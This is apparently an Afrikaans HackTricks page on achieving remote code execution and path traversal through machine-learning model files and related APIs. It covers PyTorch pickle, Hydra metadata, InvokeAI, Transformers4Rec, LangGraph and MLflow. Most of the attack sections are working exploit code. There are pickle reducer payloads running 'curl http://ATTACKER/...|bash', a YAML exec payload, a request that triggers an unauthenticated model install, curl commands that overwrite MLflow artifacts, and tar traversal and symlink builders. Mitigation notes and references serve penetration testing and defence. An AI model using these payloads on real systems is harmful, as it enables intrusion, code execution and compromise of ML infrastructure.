# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laai om RCE te kry

Masjienleermodelle word gewoonlik in verskillende formate gedeel, soos ONNX, TensorFlow, PyTorch, ens. Hierdie modelle kan op ontwikkelaars se masjiene of produksiestelsels gelaai word om gebruik te word. Die modelle behoort gewoonlik nie kwaadwillige code te bevat nie, maar daar is gevalle waar die model gebruik kan word om arbitrêre code op die stelsel uit te voer, hetsy as ’n beoogde kenmerk of weens ’n kwesbaarheid in die model-laaibiblioteek.

Die volgende tabel lys verteenwoordigende kwesbaarhede in hierdie kategorie:

| **Raamwerk / hulpmiddel**        | **Kwesbaarheid (CVE indien beskikbaar)**                                                    | **RCE-vektor**                                                                                                                           | **Verwysings**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Onveilige deserialisering in* `torch.load` **(CVE-2025-32434)**                                                              | Kwaadwillige pickle in model-checkpoint lei tot code-uitvoering (omseil die `weights_only`-veiligheidsmaatreël)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + aflaai van kwaadwillige model veroorsaak code-uitvoering; Java-deserialisering-RCE in bestuurs-API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Onveilige checkpoint-deserialisering via `torch.load` **(CVE-2025-23298)**                                           | Onbetroubare checkpoint aktiveer pickle-reducer tydens `load_model_trainer_states_from_checkpoint` → code-uitvoering in ML-werker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis-checkpointers) | SQLi + onveilige MessagePack-uitbreidingshaak **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Gebruikerbeheerde `filter`-sleutel voeg SQL/JSON-pad-sintaksis in, `UNION SELECT` vervaardig ’n vals checkpoint-ry, waarna `msgpack`-deserialisering aanvallergekose Python-code invoer en oproep | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (onveilige YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Die laai van ’n model vanaf YAML gebruik `yaml.unsafe_load` (code-uitvoering) <br> Die laai van ’n model met ’n **Lambda**-laag voer arbitrêre Python-code uit          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-ontleding)                                                                                          | ’n Vervaardigde `.tflite`-model aktiveer integer overflow → heap-korrupsie (potensiële RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Die laai van ’n model via `joblib.load` voer pickle uit met aanvaller se `__reduce__`-payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (onveilige `np.load`) *betwis*                                                                              | `numpy.load` het by verstek gepicklede objekskikkings toegelaat – kwaadwillige `.npy/.npz` aktiveer code-uitvoering                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (gidsoorgang) <br> **CVE-2024-5187** (tar-oorgang)                                                    | Die pad na eksterne gewigte van ’n ONNX-model kan buite die gids beweeg (lees arbitrêre lêers) <br> ’n Kwaadwillige ONNX-modeltar kan arbitrêre lêers oorskryf (wat tot RCE lei) | |
| ONNX Runtime (ontwerprisiko)  | *(Geen CVE)* ONNX custom ops / beheervloei                                                                                    | ’n Model met ’n custom operator vereis dat aanvaller se native code gelaai word; komplekse modelgrafieke misbruik logika om onbedoelde berekeninge uit te voer   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (padoorgang)                                                                                          | Die gebruik van model-laai-API met `--model-control` geaktiveer laat relatiewe padoorgang toe om lêers te skryf (bv. `.bashrc` oorskryf vir RCE)    | |
| **GGML (GGUF-formaat)**      | **CVE-2024-25664 … 25668** (verskeie heap-overflows)                                                                         | ’n Misvormde GGUF-modellêer veroorsaak heap-buffer-overflows in ontleder, wat arbitrêre code-uitvoering op die slagofferstelsel moontlik maak                     | |
| **Keras (ouer formate)**   | *(Geen nuwe CVE)* Ouer Keras H5-model                                                                                         | Kwaadwillige HDF5 (`.h5`)-model met Lambda-laag-code word steeds tydens laai uitgevoer (Keras safe_mode dek nie die ou formaat nie – “downgrade attack”) | |
| **Ander** (algemeen)        | *Ontwerpfout* – Pickle-serialisering                                                                                         | Baie ML-hulpmiddels (bv. pickle-gebaseerde modelformate, Python `pickle.load`) sal arbitrêre code uitvoer wat in modellêers ingebed is, tensy dit versag word | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Onbetroubare metadata deurgegee na `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Aanvallerbeheerde modelmetadata/-konfigurasie stel `_target_` op ’n arbitrêre oproepbare waarde (bv. `builtins.exec`) → word tydens laai uitgevoer, selfs met “veilige” formate (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Daar is ook sommige Python pickle-gebaseerde modelle, soos dié wat deur [PyTorch](https://github.com/pytorch/pytorch/security) gebruik word, wat arbitrêre code op die stelsel kan uitvoer as hulle nie met `weights_only=True` gelaai word nie. Enige pickle-gebaseerde model kan dus besonder vatbaar wees vir hierdie soort aanvalle, selfs al word dit nie in die tabel hierbo gelys nie.

### Hydra-metadata → RCE (werk selfs met safetensors)

`hydra.utils.instantiate()` voer enige gepunte `_target_` in ’n konfigurasie-/metadataobjek in en roep dit aan. Wanneer biblioteke soos Hugging Face Transformers **onbetroubare modelmetadata** aan `instantiate()` deurgee, kan ’n aanvaller ’n oproepbare waarde en argumente verskaf wat onmiddellik tydens modellading uitgevoer word (geen pickle nodig nie).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Voorbeeldpayload (werk in `.nemo` `model_config.yaml`, repo `config.json`, of `__metadata__` binne `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Sleutelpunte:
- Word geaktiveer voordat modelinitialisering plaasvind in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace-coders en FlexTok-laaiers.
- Hydra se stringbloklys kan omseil word via alternatiewe invoerpaaie (bv. `enum.bltns.eval`) of name wat deur die toepassing opgelos word (bv. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok ontleed ook stringvormige metadata met `ast.literal_eval`, wat DoS (CPU-/geheue-oorlading) kan veroorsaak voordat die Hydra-aanroep plaasvind.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is ’n gewilde oopbron-webkoppelvlak vir Stable-Diffusion. Weergawes **5.3.1 – 5.4.2** stel die REST-eindpunt `/api/v2/models/install` beskikbaar, wat gebruikers in staat stel om modelle van arbitrêre URL’s af te laai en te laai.<sup>[[1]](#references)</sup>

Intern roep die eindpunt uiteindelik:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Wanneer die verskafde lêer ’n **PyTorch checkpoint (`*.ckpt`)** is, voer `torch.load` **pickle-deserialisering** uit. Omdat die inhoud direk van die gebruiker-beheerde URL kom, kan ’n aanvaller ’n kwaadwillige objek met ’n pasgemaakte `__reduce__`-metode in die checkpoint insluit; die metode word **tydens deserialisering** uitgevoer, wat lei tot **remote code execution (RCE)** op die InvokeAI-bediener.

Die kwesbaarheid is **CVE-2024-12029** toegeken (CVSS 9.8, EPSS 61.17 %).

#### Exploitation-stap-vir-stap

1. Skep ’n kwaadwillige checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Huisves `payload.ckpt` op ’n HTTP-bediener onder jou beheer (bv. `http://ATTACKER/payload.ckpt`).
3. Aktiveer die kwesbare endpoint (geen verifikasie word vereis nie):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Wanneer InvokeAI die lêer aflaai, roep dit `torch.load()` aan → die `os.system`-gadget loop en die aanvaller verkry kode-uitvoering in die konteks van die InvokeAI-proses.

Gereedgemaakte exploit: die **Metasploit**-module `exploit/linux/http/invokeai_rce_cve_2024_12029` outomatiseer die hele vloei.<sup>[[3]](#references)</sup>

#### Voorwaardes

•  InvokeAI 5.3.1-5.4.2 (scan-vlag is by verstek **false**)
•  `/api/v2/models/install` is bereikbaar vir die aanvaller
•  Die proses het toestemmings om shell-opdragte uit te voer

#### Versagtingsmaatreëls

* Gradeer op na **InvokeAI ≥ 5.4.3** – die patch stel `scan=True` by verstek en skandeer vir malware voordat deserialisering plaasvind.<sup>[[2]](#references)</sup>
* Gebruik `torch.load(file, weights_only=True)` of die nuwe [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)-helper wanneer jy checkpoints programmaties laai.
* Dwing allow-lists/handtekeninge vir modelbronne af en laat die diens met die minste nodige voorregte loop.

> ⚠️ Onthou dat **enige** Python-pickle-gebaseerde formaat (insluitend baie `.pt`-, `.pkl`-, `.ckpt`- en `.pth`-lêers) inherent onveilig is om vanaf onbetroubare bronne te deserialiseer.

---

Voorbeeld van ’n ad-hoc-versagtingsmaatreël indien jy ouer InvokeAI-weergawes agter ’n reverse proxy moet laat loop:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via onveilige `torch.load` (CVE-2025-23298)

NVIDIA se Transformers4Rec (deel van Merlin) het ’n onveilige checkpoint-laaier blootgestel wat `torch.load()` direk op paaie wat deur gebruikers verskaf is, aangeroep het. Omdat `torch.load` op Python `pickle` staatmaak, kan ’n aanvaller-beheerde checkpoint arbitrêre kode via ’n reducer tydens deserialisering uitvoer.<sup>[[5]](#references)</sup>

Kwesbare pad (voor die regstelling): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Waarom dit tot RCE lei: In Python pickle kan ’n objek ’n reducer (`__reduce__`/`__setstate__`) definieer wat ’n callable en argumente teruggee. Die callable word tydens unpickling uitgevoer. As so ’n objek in ’n checkpoint voorkom, word dit uitgevoer voordat enige gewigte gebruik word.

Minimale voorbeeld van ’n kwaadwillige checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Afleweringsvektore en impakradius:
- Getrojaniseerde checkpoints/models wat via repos, buckets of artifact registries gedeel word
- Outomatiese resume/deploy-pipelines wat checkpoints outomaties laai
- Uitvoering vind plaas binne training/inference-werkers, dikwels met verhoogde voorregte (bv. root in containers)

Regstelling: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) het die direkte `torch.load()` vervang met ’n beperkte deserializer met ’n toegelate lys, geïmplementeer in `transformers4rec/utils/serialization.py`. Die nuwe loader valideer tipes/velde en verhoed dat arbitrêre callables tydens die laai opgeroep word.<sup>[[7]](#references)</sup>

Verdedigingsriglyne spesifiek vir PyTorch-checkpoints:
- Moenie onvertroude data unpickle nie. Verkies nie-uitvoerbare formate soos [Safetensors](https://huggingface.co/docs/safetensors/index) of ONNX waar moontlik.
- As jy PyTorch-serialisering moet gebruik, verseker dat `weights_only=True` gestel is (ondersteun in nuwer PyTorch) of gebruik ’n pasgemaakte unpickler met ’n toegelate lys, soortgelyk aan die Transformers4Rec-patch.<sup>[[4]](#references)</sup>
- Dwing modelherkoms/handtekeninge af en sandbox deserialisering (seccomp/AppArmor; nie-root-gebruiker; beperkte FS en geen uitgaande netwerkverbindings).
- Monitor vir onverwagte child processes vanaf ML-dienste wanneer checkpoints gelaai word; spoor die gebruik van `torch.load()`/`pickle` na.

POC- en kwesbare/patch-verwysings:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Kwesbare loader voor die patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC van kwaadwillige checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader ná die patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Voorbeeld – skep van ’n kwaadwillige PyTorch-model

- Skep die model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Laai die model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialisering Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent se FaceDetection-DSFD stel ’n `resnet`-endpoint bloot wat gebruikerbeheerde data deserialiseer. ZDI het bevestig dat ’n afstandaanvaller ’n slagoffer kan dwing om ’n kwaadwillige bladsy/lêer te laai, dit ’n vervaardigde geserialiseerde blob na daardie endpoint te laat stuur en deserialisering as `root` te aktiveer, wat tot ’n volledige kompromittering lei.

Die uitbuitingsvloei weerspieël tipiese pickle-misbruik:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Enige gadget wat tydens deserialisering bereikbaar is (konstruktors, `__setstate__`, raamwerkterugroepe, ens.) kan op dieselfde manier gewapen word, ongeag of die vervoer HTTP, WebSocket of ’n lêer was wat in ’n gemonitorde gids geplaas is.



### LangGraph checkpointer SQLi → MessagePack RCE

Hierdie aanvalsketting is interessant omdat die aanvaller **nie ’n kwaadwillige modellêer hoef op te laai nie**. Die toepassing stel eerder ’n **AI-agent-volhardings-API** (`get_state_history(..., filter=...)`) bloot, en gebruikersinvoer bereik die navraagbouer van die checkpointer.

#### 1. Strukturele SQLi in metadat filters

’n Kwesbare SQLite-patroon het soos volg gelyk:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Die waarde word later gebind, maar `query_key` word aaneengeskakel in die **JSON-padstring**, dus breek ’n `'` binne die dictionary-sleutel uit `'$.{query_key}'` en voeg SQL in. Dieselfde les geld vir **JSON-paaie, identifiseerders, operateurs, `LIMIT`- en TTL-velde**: plekhouers beskerm net waardes, nie die strukturele navraagsintaksis nie.

#### 2. `UNION SELECT` kan stroomaf-sinks teiken, nie net data steel nie

Die navraag gee `type` en geserialiseerde `checkpoint`-grepe terug, wat later gebruik word as:

```python
self.serde.loads_typed((type, checkpoint))
```

Dit beteken dat ’n SQLi in die `WHERE`-klousule ’n **vals resultaatry** kan inject:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

As latere code enige geselekteerde kolom ontleed, deserialiseer, skryf of uitvoer, koppel daardie kolomme aan hul sinks. In hierdie geval verander die vals ry SQLi in **deserialisering wat deur die aanvaller beheer word**.

#### 3. Onveilige MessagePack-uitbreidingshake is gelykstaande aan kodegadgets

LangGraph se `msgpack`-pad het ’n pasgemaakte uitbreidingshaak gebruik wat ’n geneste tuple uitgepak en die volgende uitgevoer het:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

So ’n MessagePack-uitbreidingsobjek wat iets ekwivalent aan `("os", "system", "id > /tmp/pwned")` enkodeer, voer `os` in, vind `system` op en voer die opdrag uit. Wanneer jy AI-raamwerke hersien, ondersoek **pasgemaakte MessagePack/JSON/pickle-herleerders** vir dinamiese invoere, refleksie of arbitrêre aanroepbare-funksie-versending.

#### 4. Praktiese ouditpatroon vir agentraamwerke

Hersien enige invoer wat deur die gebruiker beheer word en een van die volgende bereik:
- API’s vir die lys van statusgeskiedenis / geheue / herspeel / kontrolepunte
- gestruktureerde filterbouers wat SQL- of Redis-navraagfragmente genereer
- pasgemaakte deserialiseerders (`pickle`, `msgpack`, `json`-objekhooks, YAML-konstruktors)
- herstelpaaie wat rye vertrou wat deur die volhardingslaag teruggestuur word

Hierdie spesifieke ketting het selfgehoste LangGraph-ontplooiings geraak wat **SQLite**- of **Redis**-kontrolepunte gebruik het, wanneer onbetroubare gebruikers die `filter` kon beheer. Die gepatchte weergawes wat in die bekendmaking genoem is, was `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` en `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow PyFunc-artifaktoorskrywing na pickle RCE

’n MLflow PyFunc wat vanaf ’n `PythonModel` geskep is, kan die geserialiseerde objek as `python_model.pkl` stoor. Die modelmetadata benoem `mlflow.pyfunc.model` as sy laaier, en MLflow se implementering gebruik hierdie lêernaam vir die gestoorde Python-model. Gevolglik kan skryftoegang tot die artifakbewaarplek lei tot kode-uitvoering in ’n ander toepassing wat die model later laai.<sup>[[17]](#references)[[18]](#references)</sup>

Die nuttige ketting is **skryftoestemming vir artifakte → vervang die pickle → laat ’n afleidingsverbruiker dit herlaai**. Vir ’n eksperiment wat ’n geproksiede `mlflow-artifacts:/...`-wortel gebruik, lys die eksperiment-, uitvoer- en modelartifakpad. Die naspoorbediener stel `GET` en `PUT` bloot op `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

’n Minimale reducer kan ’n command uitvoer sodra die verbruiker die artifact unpickle. Deur die payload te genereer met die Python-weergawe wat in `MLmodel` verklaar word, vermy jy versoenbaarheidsprobleme.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Voer die bewerking uit wat die **bestaande model laai**, soos voorspelling, scoring of ontplooiing. Moenie eers weer oplei nie, want opleiding kan die kwaadwillige artefak met ’n vars model vervang. ’n Toepassingsfout bewys nie dat uitbuiting misluk het nie: die reducer gee die opdrag se heelgetal-uitgangstatus terug in plaas van ’n bruikbare model. Begin met ’n waarneembare newe-effek, soos ICMP of ’n HTTP-terugroep, en vervang dit dan met die finale payload.<sup>[[20]](#references)</sup>

Onderskei tydens ’n assessering tussen toestemming om ’n run te skep en toestemming om artefakte wat aan ’n ander run behoort, te oorskryf. Gaan die verifikasie en opdateringstoestemmings per run na, inspekteer onverwagte wysigings aan `python_model.pkl`, en beskou modelherkoms en integriteit as deel van die uitvoeringsgrens. Huidige MLflow-kode ondersteun ook die instelling van `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` en beveel models-from-code-artefakte aan in plaas daarvan om cloudpickle-data te laai.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Blootgestelde modelbedieners en ML-infrastruktuur

Die laai van ’n kwaadwillige model is nie die enigste manier om kode op ML-infrastruktuur uit te voer nie. Job-indienings-API’s, kodevalideringsendpunte en modelregister-pulls van selfgehoste AI-dienste kan tot kode-uitvoering lei sonder enige modelleêr. Sien [Blootgestelde selfgehoste AI-dienste](AI-Exposed-Self-Hosted-AI-Services.md).

## Modelle tot Path Traversal

Soos in [**hierdie blogplasing**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) opgemerk word, is die meeste model-formate wat deur verskillende AI-raamwerke gebruik word, op argiewe gebaseer, gewoonlik `.zip`. Daarom kan dit moontlik wees om hierdie formate te misbruik om Path Traversal-aanvalle uit te voer, sodat willekeurige lêers gelees kan word vanaf die stelsel waarop die model gelaai word.<sup>[[16]](#references)</sup>

Met die volgende kode kan jy byvoorbeeld ’n model skep wat ’n lêer in die `/tmp`-gids skep wanneer dit gelaai word:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Of, met die volgende kode kan jy ’n model skep wat ’n symlink na die `/tmp`-gids sal skep wanneer dit gelaai word:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Diepgaande gids: Keras .keras-deserialisering en gadget hunting

Vir ’n gefokusde gids oor die interne werking van .keras, Lambda-layer RCE, die arbitrary import-kwessie in ≤ 3.8 en die ontdekking van gadgets binne die allowlist ná die regstelling, sien:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec-blog – "CVE-2024-12029 – InvokeAI-deserialisering van onbetroubare data"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI-regstellingscommit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit-module-dokumentasie](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – sekuriteitsoorwegings vir torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI-blog – CVE-2025-23298: Kry afstandkode-uitvoering in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI-advies: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec-regstellingscommit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Kwetsbare loader voor die regstelling (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Bewys-van-konsep vir kwaadwillige kontrolepunt (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader ná die regstelling (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Afstandkode-uitvoering met moderne AI/ML-formate en -biblioteke](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra-instantieerdokumentasie](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra-bloklys-commit (waarskuwing oor RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Van SQLi tot RCE: Uitbuiting van LangGraph se Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Omskakeling van Archive Slip-foute in waardevolle AI/ML-bountygeleenthede](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk-advies en PyFunc-bewys van konsep – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow-bronkode – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – eindpunte vir die aflaai en oplaai van artefakte](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
